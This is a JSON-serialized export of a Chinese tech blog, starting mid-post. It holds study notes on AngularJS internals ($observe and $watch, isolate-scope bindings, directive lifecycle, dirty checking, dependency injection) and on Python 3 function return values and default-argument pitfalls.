trueexpect(scope.$eval(function(scope)&#123; return scope.a + scope.b;&#125;)).toEqual(3); // true $eval还有一个异步版本，$evalAsync,它会将表达式缓存起来，等到下一次的$digest开始前执行，这样能获得较好的性能。 $observe和$watch$observe和$watch都可用于监听值的变化，但$observe是用来监听DOM中属性值变化的，而$watch则是监听scope中属性值的变化的。 一般情况下$watch已经足够，但当在指令的DOM属性上使用了ng表达式时（即{ { } }）,这时则DOM的属性值为字符串而不是表达式的运算结果。 $observe源码（定义在compile.js中）：1234567891011121314$observe: function(key, fn)&#123; var attrs = this, $$observers = (attrs.$$observers || (attrs.$$observers = &#123;&#125;)), listeners = ($$observers[key] || ($$observers[key] = [])); listeners.push(fn); $rootScope.$evalAsync(function()&#123; if(!listeners.$$inter)&#123; fn(attrs[key]); &#125; &#125;); return fn;&#125; 由上可知，$observe是通过$evalAsync函数实现，它会延迟到下一轮脏检查时执行，由于$observe方法是定义在link函数的第三个参数iAttrs上的，所以只能在指令的link函数中使用它。 $observe的回调函数只有一个参数，那就是新值，而$watch有两个参数，分别是新值和旧值 比如，指令在DOM中属性如下：1&lt;div book=\"Name:&#123;&#123;book.name&#125;&#125;\"&gt;&lt;/div&gt; 则在指令中的使用为：123iAttrs.$observe('book', function(newValue)&#123; ...&#125;); 上面代码若改为scope.$watch(iAttrs.book, ...)是无效的，因为book属性值不能被$eval解析。 相对$observe, $watch则复杂但也灵活一些，它可以监听一个函数或一个字符串，若是字符串则自动封装为一个简单函数，然后在每次$digest循环时被调用，但这个表达式字符串不能包含{ {} }，因为它实际上是一段js代码，会被$eval执行。 如下DOM属性中定义的表达式不包含{ {} }：1&lt;div book=\"book.name\"&gt;&lt;/div&gt; 若$watch：123scope.$watch('book.name', function(newVaule, oldValue)&#123; ...&#125;); 或在link函数中:12345// iAttrs.book 的值为 'book.name'scope.$watch(iAttrs.book, function(newValue, oldValue)&#123; ...&#125;);// 若换成iAttrs.$observe('book')的话，则只被调用一次，值为“book.name” 使用场景关于独立scope声明中的“@”，“&amp;”,”=”三种形式，一直没明白到底是如何使用的，可以先看下这个帖子，学习如何使用AngularJS Directive 隔离 Scope 数据交互 先看最简单的“&amp;”的实现，它将属性值传给$parse服务，在父scope上解析未一个可调用的计算函数，再包装成一个只需要locals参数的函数，然后存放在子scope上。它定义再父scope上，但可在子scope中被调用，这样就实现了子scope对父scope的回调。需要注意：参数中可以传入一个本地的上下文对象，用于覆盖或新增变量（原来上下文对象中不存在的）。所以，若在DOM中定义：1&lt;div buy-book=\"buyBook($bookId, $amount);\"&gt;&lt;/div&gt; 在子scope中可用如下方式调用：1234scope.buyBook(&#123; $bookId: 1111, $amout: 2&#125;); 注意：传递的参数是本地上下文对象，所以应该是一个Object对象，以参数名为key值，参数值为value。 然后是”@”的实现，它使用attrs.$observe来监听DOM属性的变化，当属性值发生变化后，它直接将新值放在指令的独立scope上。由于attrs.$observe的值总是字符串，所以“@”值也一样，若DOM中表达式{ {} }计算得到新值，它就会触发，然后ng还会检查若存在表达式顶会议，则解析并未scope赋初始值。 最后是”=”的实现，用到了scope.$watch函数，而在$watch函数中，ng会先比较父scope和子scope之间是否有变化，若有则同步两者。然后再将缓存的原值和父scope的当前值比较，判断父scope发生了变化还是子scope发生了变化。总之，要将两者同步。由于$watch函数监听的是scope上的属性，所以再使用“=”定义时，不能包含{ {} }表达式，而应该是一个能被$eval解析的合法表达式。 下面为ng实现源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556forEach(newIsolateScopeDirective.scope, function(definition, scopeName)&#123; ... isolateScope.$$isolateBindings[scopeName] = mode + attrName; switch(mode)&#123; case '@': attrs.$observe(attrName, function(value)&#123; // 监听Attribute值的变化 isolateScope[scopeName] = value; &#125;); attrs.$$observers[attrName].$$scope = scope; // 赋值为了在指令中的监听使用 if(attrs[attrsName])&#123; isolateScope[scopeName] = $interpolate(attrs[attrName])(scope); // 解析初始值，赋值在scope上 &#125; break; case '=': if(optional &amp;&amp; !attrs[attrName])&#123; // Attribute必须有值，因为它需要指向父scope的model属性 return; &#125; parentGet = $parse(attrs[attrName]); if(parentGet.literal)&#123; // 获取对属性值的比较函数 compare = equals; &#125;else&#123; compare = function(a,b)&#123; return a === b || (a !== a &amp;&amp; b !== b); &#125;; &#125; parentSet = parentGet.assign || function()&#123; ... // 抛异常 &#125;; lastValue = isolateScope[scopeName] = parentGet(scope); // 缓存初始值，用于区分父还是子scope的变化 isolateScope.$watch(function parentValueWatch()&#123; // 监听父scope的属性是否发生变化 var parentValue = parentGet(scope); // 获取父scope的值 if(!compare(parentValue, isolateScope[scopeName]))&#123; // 比较父scope和子scope是否变化 if(!compare(parentValue, lastValue))&#123; // 若父scope不等于旧值，那么说明父变化，将赋值给子scope isolateS cope[scopeName] = parentValue; &#125;else&#123; // 若父未变化，则子变化，将子scope变化同步到父scope parentSet(scope, parentValue = isolateScope[scopeName]); &#125; &#125; return lastValue = parentValue; // 缓存本次的值，便于下次比较 &#125;, null, parentGet.literal); break; case '&amp;': parentGet = $parse(attrs[attrName]); // 将Attribute的值解析未ng解析表达式函数 isolateScope[scopeName] = function(locals)&#123; // 将Attribute中的解析函数继续封装未一个函数，供子scope调用 return parentGet(scope, locals); // 调用父scope的声明方法 &#125;： break; default: ... // 抛异常 &#125;&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-35-指令生命周期","slug":"angularjs35","date":"2017-08-09T12:36:50.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/08/09/angularjs35/","link":"","permalink":"https://github.com/xmoyKING/2017/08/09/angularjs35/","excerpt":"","text":"指令是ng提出的一个概念，为HTML提供了DSL（特定领域语言）的扩展语法，并为组件化（Web Component)提供了帮助。 指令有自己的生命周期，一个指令从解析到生效，会经历inject、compile、controller加载、pre-link、post-link这几个主要阶段。以如下指令为例：1234567891011121314151617181920212223242526272829303132angular.module('com.ngnice.app').directive('directiveLife', function($log)&#123; $log.info('injecting function directiveLife'); return &#123; restrict: 'EA', transclude: true, replace: true, template: '&lt;div&gt;&lt;h2&gt;count: &#123;&#123;count&#125;&#125; &lt;/h2&gt;&lt;p ng-transclude&gt;&lt;/p&gt;&lt;/div&gt;', scope: &#123; count: '=', &#125;, compile: function(elm, iAttrs)&#123; $log.info('compile', 'count value from attribute: ' + iAttrs.count); return &#123; pre: function(scope, elm, iAttrs)&#123; $log.info('pre-link', 'count value from attribute: '+ iAttrs.count, 'count value from scope: '+scope.count); &#125;, post: function(scope, elm, iAttrs)&#123; $log.info('post-link', 'count value from attribute: '+ iAttrs.count, 'count value from scope: '+scope.count); &#125;, &#125;; &#125;, controller: function($scope)&#123; $log.info('controller', 'count value from controller: '+ $scope.count); &#125; &#125;;&#125;);angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; return vm;&#125;); 上述代码创建了名为directiveLife的指令，用于展示指令的执行顺序，它有一个count属性，当页面中复用这个指令时可用于区分各自指令的执行过程。12345&lt;body ng-controller=\"DemoController as demo\"&gt; &lt;div id=\"directiveLife\"&gt; &lt;directive-life count=\"1\"&gt;&lt;/directive-life&gt; &lt;/div&gt;&lt;/body&gt; 然后可从控制台看到如下日志信息：12345injecting function directiveLifecompile count value from attribute: 1controller count value from controller: 1pre-link count value from attribute: 1 count value from scope: 1post-link count value from attribute: 1 count value from scope: 1 上述输出展示了指令执行时的顺序，每一个阶段都负责完成不同的功能。 如下时指令生命周期示意图： injecting阶段在ng第一次使用该指令时，会先调用注入函数来获取它依赖的服务，此过程仅发生在首次解析该指令时，即多此使用同一个指令只注入一次所依赖的服务。在injecting阶段，因为在一个闭包中，所以所有directiveLife指令共享同一个作用域，所以此阶段设置的Directive的配置信息会被所有后续调用的指令共享，有点类似默认配置，但不建议在此配置，因为有更好的方法专门用于配置使用： ng中所有的Service时全局共享的，所以可将这类配置信息抽取到一个Constant中，然后在指令中注入该Constant 在config阶段配置默认信息 以下时ng指令注册源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546var hasDirectives = &#123;&#125;, Suffix = 'Directive'; ...this.directive = function registerDIrective(name, directiveFactory)&#123; assertNotHasOwnProperty(name, 'directive'); if(isString(name))&#123; assertArg(directiveFactory, 'directiveFactory'); if(!hasDirectives.hasOwnProperty(name))&#123; hasDirectives[name] = []; $provide.factory(name + Suffix, ['$injector', '$exceptionHandler', function($injector, $exceptionHandler)&#123; var directives = []; forEach(hasDirective[name], function(directiveFactory, index)&#123; try&#123; var directive = $injector.invoke(directiveFactory); if(isFunction(directive))&#123; directive = &#123; compile: valueFn(directive) &#125;; &#125;else if(!directive.compile &amp;&amp; directive.link)&#123; directive.compile = valueFn(directive.link); &#125; directive.priority = directive.priority || 0; directive.index = index; directive.name = directive.name || name; directive.require = directive.require || (directive.controller &amp;&amp; directive.name); directive.restrict = directive.restrict || 'A'; directive.push(directive); &#125;catch(e)&#123; $exceptionHandler(e); &#125; &#125;); return directive; &#125;]); &#125; hasDirectives[name].push(directiveFactory); &#125;else&#123; forEach(name, reverseParams(registerDirective)); &#125; return this;&#125;; 由源码可知，ng的指令注册分为2种情况，一种时单个Directive注册，以名称和directiveFactory两个对象为参数；另一种时以Object对象key/value键值对为参数注册多个Directive,key为Directive名称，value为directiveFactory。 然后将指令的某个变量hasDirectives[name]的值初始化为一个空数组，这意味着ng可以声明多个同名的Directive，按照注册、解析、标注优先级的顺序逐个执行。其实ng对input元素的扩展就是利用这一点完成的。但在自己的程序中不建议这样做，因为会使得逻辑分散不利于维护和调试。 接下来，利用$provide.factory以指令名称加上Directive为后缀注册一个ng服务，所以可以利用ng的注入机制在Controller、Service中被注入：12345angular.module('com.ngnice.app').controller('DemoController', function(directiveLifeDirective)&#123; var vm = this; console.log(directiveLifeDirective); return vm;&#125;); 实际使用中，不需要手动调用上述代码，因为指令是声明在HTML模板上的，ng会自动解析指令。在某些情况下，若需要手动编译模板追加到DOM上时，推荐写法时利用$compile服务解析指令和链接$scope，然后将编译结果追加到DOM上。 compile和link阶段以上注入构造对象阶段完成后，ng会调用指令的compile函数，这个函数会在每一次指令被实例化时执行，执行时被传入2个参数，一个是原始的DOM节点，一个是它所包含的Attribute信息。这里的原始DOM节点指的是初始声明的节点，还没有被link过，所以此时虽然可以检查DOM信息和表达式字符串，但无法访问$scope对象，也无法获得表达式的结果值。 但此时是修改节点，插入子模版的最佳阶段，然后所有这些节点会被ng自动compile，在compile函数的最后一句返回接下来会用到的link函数，link函数包括pre和post2种。 在进入link阶段， ng根据在指令中声明的scope属性，创建一个独立或者非独立的scope，然后调用指令的controller来初始化这个scope。此时虽然不能涉及任何DOM节点操作，但可以利用ng的$injector注入$scope服务，在ng指令中这是被复用的。由于不涉及任何DOM操作，只包含业务逻辑代码，所以它可被同一节点或子节点上的指令通过设置require属性获取，比如为了修改或添加ngModel的parse函数而设置require:&#39;ngModel&#39;其实引用的就是当前结点上的ngModelController控制器。 在controller中初始化指令的$scope后，将进入解析阶段，分为两个阶段，pre-link和post-link，对同一指令的所有实例他们只执行一次，比如ngRepeat每一个item会被执行一次，因为在前面的controller中以及初始化好$scope对象，所以在这里$scope是可用的。 注：此处的scope与Controller中的$scope不同，此处的scope对象是传入函数的参数，而Controller中的$scope是被ng注入的。 在此阶段，每个表达式都会确定值，然后ng开始将模板渲染到DOM，若在此阶段想添加模板，则有些晚了，因为ng不会自动解析，只能手动调用$compile服务来编译链接模板，并插入到指定DOM节点中。 ng中的link函数有多种方式定义，其中post-link最重要，若直接在指令中返回一个函数，或设置link属性为一个函数，则默认为post-link函数。 通过下例理解pre-link和post-link的区别，在嵌套的指令中标注了编号：12345678910&lt;body ng-controller=\"DemoController as demo\"&gt; &lt;div id=\"directiveLife\"&gt; &lt;directive-life count=\"1\"&gt; &lt;directive-life count=\"2\"&gt; &lt;directive-life count=\"3\"&gt; &lt;/directive-life&gt; &lt;/directive-life&gt; &lt;/directive-life&gt; &lt;/div&gt;&lt;/body&gt; 控制台输出信息：123456789injecting function directiveLifepre-link count value from attribute: 1 count value from scope: 1pre-link count value from attribute: 2 count value from scope: 2pre-link count value from attribute: 3 count value from scope: 3post-link count value from attribute: 3 count value from scope: 3post-link count value from attribute: 2 count value from scope: 2post-link count value from attribute: 1 count value from scope: 1 从输出信息可以看出，injecting只会初始化一次，ng在链接指令时，先执行pre-link，然后深度遍历每一个子节点的pre-link直到最深的子节点，然后从最深子节点开始返回依次冒泡触发post-link，是一个先进后出的栈模型。 为什么post-link与pre-link是相反的顺序呢？由于有时指令操作需要直到子元素的信息，如子元素个数，DOM结构等，所以在指令的link阶段，执行pre-link时子节点的DOM还无法确定，不适合添加节点事件。但pre阶段非常适合初始化内部下级指令需要的数据，当下级指令需要得到一些初始化数据的时候，那么就可以写在pre-link函数中，比如ng中的ngInit指令，它的作用就是在pre-link阶段为子节点中的指令设置初始值的。12345678910var ngInitDirective = ngDirective(&#123; priority: 450, compile: function()&#123; return &#123; pre: function(scope, element, attrs)&#123; scope.$eval(attrs.ngInit); &#125;, &#125;; &#125;&#125;); 当然，初始化数据也可以在controller中进行，但当若需要先获取DOM的信息（如ngInit的表达式字符串）才能初始化时，pre-link函数就非常适合了，在ng中类似的指令还有ngForm。 在实际的自定义指令中，使用pre-link的机会不多，大都是post-link，在post-link执行时内嵌指令以及被链接过，DOM结构已稳定，所以在post阶段可放心为当前节点或子节点添加行为或监听事件，如自动聚焦、双向绑定。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-34-脏检查机制","slug":"angularjs34","date":"2017-08-07T10:19:58.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/08/07/angularjs34/","link":"","permalink":"https://github.com/xmoyKING/2017/08/07/angularjs34/","excerpt":"","text":"“脏检查”时ng中的核心机制之一，它时实现双向绑定、MVVM模式的重要基础。用一句话概括即：ng将双向绑定转换为一堆watch表达式，然后递归检查这些watch表达式的结果是否变了，若变了，则执行相应的watcher函数，等到Model的值不再变化，也就不再有watcher函数被触发，一个完整的digest循环就结束了。这时，浏览器会重新渲染DOM来体现model的改变，这里的watcher函数就view上的指令（如ngBind、ngShow、ngHide等）或{ { } }表达式（严格来说时$compile服务）所注册的，指令在ng的compile阶段会被逐一解析、注册。 浏览器事件循环和ng的MVW在浏览器中js时靠事件循环工作的，浏览器中存在一个事件循环池，无限循环以保持执行工程的可用，等待事件（如layout、paint、鼠标点击、键盘输入等）并执行他们。程序员的代码则先通过注册事件回调函数来响应这类事件，然后等待js引擎来执行回调函数。在回调函数中一般操作DOM或改变样式，一旦回调函数执行完成，浏览器就会执行渲染更新界面。 如下时js在浏览器中的事件循环模型：来自浏览器本身或键盘等设备的事件会被浏览器放入事件队列中，然后一次被单线程的Event Loop(事件循环)分配给对应的回调函数，最后浏览器更新DOM状态。 NodeJS也是基于事件循环的，所有的I/O操作，如HTTP请求，数据查询，磁盘文件I/O操作，都会异步执行，然后等被注册的事件回调函数在主线程中处理。 ng扩展了浏览器的事件模型，创建了一个独特的执行环境。ng在View上声明的事件指令，如ngClick、ngChange等，会将浏览器的事件转发给$scope这个ViewModel的响应函数，等待响应函数中改变Model，然后触发“脏检查”刷新View。 $rootScope对象时ng中所有$scope对象的祖先，所有的$scope都是直接或间接利用$rootScope提供的$new方法创建的，他们都是从$rootScope中继承了$new、$watch、$watchGroup、$watchCollection、$digest、$destroy、$eval、$evalAsync、$apply、$on、$emit、$broadcast等方法，并且有$id、$parent这两个属性。 ng中的$watch函数在ng中，大部分指令都依赖watcher函数来监听Model的变化，以更新View，它是“脏检查”的核心之一。下面是$watch函数的源码：12345678910111213141516171819202122232425$watch: function(watchExp, listener, objectEquality)&#123; var scope = this, get = compileToFn(watchExp, 'watch'), array = scope.$$watchers, watcher = &#123; fn: listener, // 监听函数 last: initWatchVal, // 上次的值 get: get, // 获取监听表达式的值 exp: watchExp, // 监听表达式 eq: !!objectEquality //是否需要深度对比 &#125;; lastDirtyWatch = null; ... if(!array)&#123; array = scope.$$watchers = []; &#125; array.unshift(watcher); return function deregisterWatch()&#123; arrayRemove(array, watcher); lastDirtyWatch = null; &#125;;&#125; 上面代码中每一个watcher对象都包括：监听函数fn、上次变化的值last(最初为初始值)、获取监听表达式等… 所谓的深度对比，是指使用angular.equals()函数进行对比。 watch表达式很灵活，可以是函数、$scope上的一个属性名、字符串形式的表达式。$scope上的属性名或表达式、最终都会被$parse服务解析为用于响应的获取属性值的函数。所有的watcher函数都会被unshift函数插入scope.$$watchers数组的头部，以便后面的$digest使用。最后，$watch函数会返回一个反注册函数，其用于移除注册的watcher。 ng默认不适用angular.equals()函数进行深度比较是因为使用 === 的方式更快，但由于===对数组或object进行比较时检查的时引用，所以即使内容完全一样的两个表达式也会判定为不同。此时，若需要进行深度比较，需要将第三个参数设置为true. ng还提供了$watchGroup、$watchCollection方法来监听数组或一组属性。 ng中的$digest函数对浏览器的事件循环，ng到底做了那些扩展？当接收view上的神机箭指令所转发的事件时，就会切换到ng的环境来响应事件，此时$digest循环就会触发。$digest循环实际上包括两个while循环，分别处理$evalAsync的异步运算队列、处理$watch的watchers队列。 当$digest循环发生时，它会便利当前$scope及其所有子$scope上注册的所有watchers函数，所谓的“脏检查”就是遍历所有的watcher函数，遍历一遍称为一轮脏检查。每执行完一轮检查时，若任何一个watcher所监听的指改变过，那么会接着执行一轮，直到所有的watcher函数都稳定不再改变。 从第一轮检查直到结果稳定，这个过程就是完整的$digest循环，当$digest循环结束时，ng将模型最后的变化更新到DOM中，这样是为了合并多个更新，防止频繁DOM操作。但若直到10轮检查都没有稳定，则会抛出异常防止无限循环检查下去。 那么什么时候触发“脏检查”就变得很重要了。 每一个进入ng环境的事件都会执行一次$digest循环，对于ngModel监听的表单交互控件来说，每输入一个字符，就会触发一次循环来检查watcher函数，以便及时更新view， 在angular1.3之后，可以使用ngModelOptions对触发方式进行配置。 ngClick、ngSubmit、ngChange等事件指令，$http、$resource这类外部ajax数据获取的回调函数、以及$timeout、$interval都会直接或间接调用$scope.$digest函数。 $digest源码 多看几遍就看懂了:)：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495$digest: function()&#123; var watch, value, last, watchers, asyncQueue = this.$$asyncQueue, postDigestQueue = this.$$postDigestQueue, length, dirty, ttl = TTL, // TTL默认为10，循环最大轮数 next, current, target = this, watchLog = [], logIdx, logMsg, asyncTask; beginPhase('$digest'); // 设置$$phase状态为$digest中 $browser.$$checkUrlChange(); lastDirtyWatch = null; do&#123; // \"脏检查\"循环开始 dirty = false; current = target; // 先执行由$scope.$evalAsync注册的异步对象 while(asyncQueue.length)&#123; try&#123; asyncTask = asyncQueue.shift(); asyncTask.scope.$eval(asyncTask.expression); &#125;catch(e)&#123; clearPhase(); $excpetionHandler(e); &#125; lastDirtyWatch = null; &#125; traverseScopeLoop: do&#123; // 对当前$scope及其子$scope循环 if((watchers = current.$$watchers))&#123; // 对当前$scope的watcher函数询问 length = watchers.length; while(length--)&#123; try&#123; watch = watchers[length]; // 首先会使用js的 === 比较，因为比较快，再视情况使用angular.equals比较 // 对number类型比较应排除NaN if(watch)&#123; if( (value = watch.get(current)) !== (last = watch.last) &amp;&amp; !(watch.eq?equals(value, last):(typeof value === 'number' &amp;&amp; typeof last === 'number' &amp;&amp; isNaN(value) &amp;&amp; isNaN(last))) )&#123; dirty = true; lastDirtyWatch = watch; watch.last = watch.eq?copy(value, null):value; // 执行watcher的监听函数，参数为：新值、旧值、当前$scope watch.fn(value, ((last === initWatchVal)?value:last), current); if(ttl &lt; 5)&#123; // ... log message &#125; &#125;else if(watch === lastDirtyWatch)&#123; dirty = false; break traverseScopeLoop; &#125; &#125; &#125;catch(e)&#123; clearPahse(); // 去除$$phase的$digest状态 $exceptionHandler(e); &#125; &#125; &#125; // 对后代$scope循环，所有的watcher函数都会检查 if( !(next = (current.$$childHead || (current !== target &amp;&amp; current.$$nextSibling))) )&#123; while(current !== target &amp;&amp; !(next = current.$$nextSibling))&#123; current = current.$parent; &#125; &#125; &#125;while((current = next)); // 进入下一个子$scope $digest if((dirty || asyncQueue.length) &amp;&amp; !(ttl--))&#123; // 若超过默认10次digest循环，抛出异常，终止循环、 clearPhase(); throw $rootScopeMinErr('infdig', '&#123;0&#125; $digest() iterations reached. Aborting!\\n' + 'Watchers fired in the last 5 iterations: &#123;1&#125;', TTL, toJson(watchLog)); &#125; &#125;while(dirty || asyncQueue.length); clearPhase(); // 去除$$phase的$digest状态 while(postDigestQueue.length)&#123; try&#123; postDigestQueue.shift()(); &#125;catch(e)&#123; $exceptionHandler(e); &#125; &#125;&#125; ng中的$apply$digest是一个内部函数，正常的应用是不应该直接调用它的，而应该调用scope.$apply函数，它是触发ng“脏检查”的公开接口。12345678910111213141516$apply: function(expr)&#123; try&#123; beginPhase('$apply'); return this.$eval(expr); &#125;catch(e)&#123; $exceptionHandler(e); &#125;finally&#123; clearPhase(); try&#123; $rootScope.$digest(); &#125;catch(e)&#123; $exceptionHandler(e); throw e; &#125; &#125;&#125; 首先设置$$phase为$apply阶段，并利用$scope.$eval方法来执行计算传入的ng表达式，更新Model或ViewModel的值，然而不管执行是成功还是失败，都会进入ng的$digest方法中。但ng只能管理自己的行为而无法管理第三方插件，不能自动更新视图，所以需要手动调用$scope.$apply。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-33-依赖注入","slug":"angularjs33","date":"2017-08-04T09:25:26.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/08/04/angularjs33/","link":"","permalink":"https://github.com/xmoyKING/2017/08/04/angularjs33/","excerpt":"","text":"依赖注入（Dependency Injection）简称DI, 简单理解一下什么是DI。 当写程序时需要某个对象（完成某种任务），有如下几种方式来获取这个对象： 每次都手动创建这个是最简单直接的方式，但由于对象创建可能很复杂，比如需要很多参数初始化，甚至它依赖很多其他对象，所以这种自己创建的方式可能并不是非常好，无法适应复杂的对象，同时随着对象的复杂化，难度成倍提升。总之，自己动手丰衣足食是一个很难实现的理想。 从全局中查找并获取这种方式也很容易想到，不用每次都创建，而是最开始创建一个全局对象，然后用到时到全局对象中查找即可，obj = globalRegisterObj.get(objId)这种方式不用管它的初始化，拿来就用，非常nice。但，仍然是有问题的，比如它很难被单元测试，全局变量是单元测试中的魔鬼，因为它让各个“单元”相互耦合。 DI —— 衣来伸手饭来张口所谓的DI, 就是直接指定所需对象，然后在使用时即有人将这些对象给出。这个“人”可能就是“框架（Framework）”，也可能是“测试容器（Test Runner）”，使用者不需要关心这个“人”是谁，也不需要关心这个“人”是如何将所需对象给出的。这个“人”的专业叫法为“容器”。“指定所需对象”的方式也有多种，比如直接声明一个属性，或者写一个注解（annotation），或者用配置文件声明依赖关系，或者在函数参数中声明。ng所采用的方式是函数参数，以及特殊的annotation来防止代码压缩破坏参数名（在使用js代码压缩工具时，一般会将函数参数名替换掉，但是这会破坏ng的DI声明）。 如何用js实现DI在js中实现DI，看似很难，其他原理很简单，关键是函数对象的toString()方法。在js中，对一个函数对象执行toString(),返回值是函数的源码，拿到源码后就可以对函数的声明进行解析了。伪代码如下：1234567891011121314151617181920212223242526272829303132333435// giveMe函数声明了一个叫config的参数，希望容器根据这个名字找到同名对象，并且注入var giveMe = function(config)&#123; // 经过注入后，此处config的内容为&#123;delay: 1&#125; // 跟registry中保存的是同一个实例&#125;;// 全局注册表对象，这里保存了可注入的对象，包括一个名为config的对象var registry = &#123; config : &#123; delay : 1 &#125;&#125;;// 注入函数，此处用来演示注入容器的行为// thisForFunc 用于在需要时，调用者可以额外指定一个this，以避免this错误的问题var inject = function(func, thisForFunc)&#123; // 获取func的源码，这样能知道func需要什么参数 var sourceCode = func.toString(); // 用正则表达式解析源码 var matcher = sourceCode.match(/* 正则表达式较复杂省略 */); // 从matcher中解析出各个参数的名称、解析过程省略 var objectIds = ... // 准备调用func时用的参数表 var objects = []; for(var i = 0; i &lt; objectIds.length; ++i)&#123; var objectName = objectIds[i]; // 根据对象名称查出相应的对象 var object = registry[objectName]; // 放到数组中准备作为参数传递过去 objects.push(object); &#125; // 调用apply同调func函数，并将参数传过去 func.apply(thisForFunc || func, objects);&#125; 使用时调用 inject(giveMe) 或 inject(giveMe, anotherThis) 即可.实际上，DI需要考虑很多问题，但是基本原理是这样。 ng中的DIng中,主要的一些编程元素都需要通过某种方式注册进去，比如myModule.service(&#39;serviceName&#39;, function()..),实际就是把后面的函数加入容器中，并且命名为serviceName，以供后续使用。 ng的实现中使用了延迟初始化，即，只有当对象被用到时，才会被创建，否则不会创建，这种延迟初始化提高了启动速度。 问题，ng的容器是什么？与上面的伪代码不同，ng中不存在真正的全局对象，所以可以放心的在页面中添加多个ng-app而不用担心他们互相干扰。但容器又需要一个公用的地方来存放这些“名字和对象”的注册表（Registry), 在ng中，这个注册表就是module，所以一个app可以使用很多不同名字的module，他们之间可以存在依赖关系。angular.module(&#39;someModule&#39;,[&#39;dep1&#39;, &#39;dep2&#39;]), 这种划分module有利于程序的文件组织和复用。 根据DI的原理，可以发现，所有被注入的对象都是单例对象，只创建一次然后多次复用，因此若需要在ng中跨Controller共享数据或相互通信，则创建一个Service/Value/Constant，然后将他们分别注入到多个Controller中，这写Controller就自然共享同一个对象了。 另外，DI的实现需要容器进行处理，所以，ng中只有某几种函数可以使用依赖注入，分别是：controller、service/factory/provider、directive、filter、animation、config、run、decorator。简单的说，通过module注册进来的函数都可以使用，因为module负责管理这些注入的服务。其中provider比较特殊，在它的声明和$get函数中都是可以注入的，但注入的内容有限制，如：12345angular.module('com.ngnice.app').provider('test', function(/* 此处只能注入constant和已定义的provider，不能注入服务 */)&#123; this.$get = function(/* 此处可以注入服务，就像在controller函数中一样 */)&#123; ... &#125;;&#125;); 看似DI的使用受限，但由于js作用域特殊，在外层函数中定义的变量可被内层函数使用，而几乎所有的ng代码都被包含在上述的几个函数中，所以通常情况下，只要注入一次就可以到处使用。 但，当出现循环依赖时就不能使用依赖注入了，必须使用手动注入的方式解决循环依赖问题，即通过$injector在代码执行时获取指定名称的服务，比如当$http和interceptor服务之间出现了循环依赖，解决方法为：$injector.get(&#39;$http&#39;)。 DI与minify大多数情况下，在项目发布时都需要对代码进行压缩（minify），即减少js文件大小，同时能起到一些混淆加密的作用。简单的说就是将参数以及部分变量、函数名进行重命名，这种方法方式一般的项目能正常工作，但ng项目例外。 由于ng的DI机制是根据参数名进行注入的，所以对参数名进行重命名会破坏ng的DI机制。所以若不进行特殊的处理，minify后的代码在执行时肯定会报错的，提示找不到服务。 不过由于minify不能修改字符串，所以利用这点，ng的处理方法就是用数组代替函数，如：123angular.module('com.ngnice.app').controller('TestController', ['$http', '$timeout', function($http, $timeout)&#123; ...&#125;]); 也就是说，数组的最后一个元素是函数，前面都是字符串格式的服务名，同时函数的参数与这些服务名一一对应。 另外一种解决的方式是使用annotation（注解）, 如下代码需要依赖$http和$route：123456var MyController = function(obfuscatedScope, obfuscatedRoute)&#123; //...&#125;;// 给MyController函数添加一个$inject属性，一个数组，指定了需要被注入的对象MyController['$inject'] = ['$scope', '$route']; 上述两种方式都又一个麻烦的地方，那就是当依赖（被注入的对象）改变时要同时修改两个地方。 不过，在实际的实现种，ng提供了对此进行处理的工具，ngAnnotate(原ngMin)，它的作用就是找到代码种的controller的定义，然后将它修改为annotation的形式。所以一般ng项目在build过程中都会先调用ngAnnotate，然后在minify。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"python3入门-廖雪峰python3教程笔记","slug":"python-beginner-note","date":"2017-08-02T00:36:58.000Z","updated":"2017-08-02T00:36:58.000Z","comments":true,"path":"2017/08/02/python-beginner-note/","link":"","permalink":"https://github.com/xmoyKING/2017/08/02/python-beginner-note/","excerpt":"","text":"主要记录下自己学习过程中的一些小笔记和疑问，以备复习巩固，主要学习资料为：Python3入门-by廖雪峰 函数返回值参考：定义函数 一个函数可以返回多个值，用逗号分隔开即可，其实是被隐式的转换为一个tuple元组了,然后在调用函数后使用多个变量去接收这个tuple，而能够依次对应tuple中的每一个值，这种方式与js6中的解构赋值的新特性非常相似。123456import mathdef move(x, y, step, angle=0): nx = x + step * math.cos(angle) ny = y - step * math.sin(angle) return nx, ny 使用：123x, y = move(100, 100, 60, math.pi / 6)print(x, y)151.96152422706632 70.0 函数的参数参考：函数的参数 一个函数,传入一个list，添加一个END再返回：123def add_end(L=[]): L.append('END') return L 普通传入数组的情况下是能正常使用的，1234add_end([1, 2, 3])[1, 2, 3, 'END']add_end(['x', 'y', 'z'])['x', 'y', 'z', 'END'] 但是若连续多次使用默认参数则会出现如下问题：1234add_end()['END', 'END']add_end()['END', 'END', 'END'] 似乎提到了这样的问题：关于多次调用同一个函数且不提供参数覆盖默认参数时会出现默认参数不销毁的问题（从其他高级语言如java,c++等类比，理论上函数调用后所有的局部变量都会被销毁） 博主的解释是python中函数定义的时候即将参数值初始化（而不是运行时再初始化）导致的，而解决的方法就是将默认参数指向不变对象，比如改为None，然后在函数内首先判断是否为None即可解决此问题：12345def add_end(L=None): if L is None: L = [] L.append('END') return L 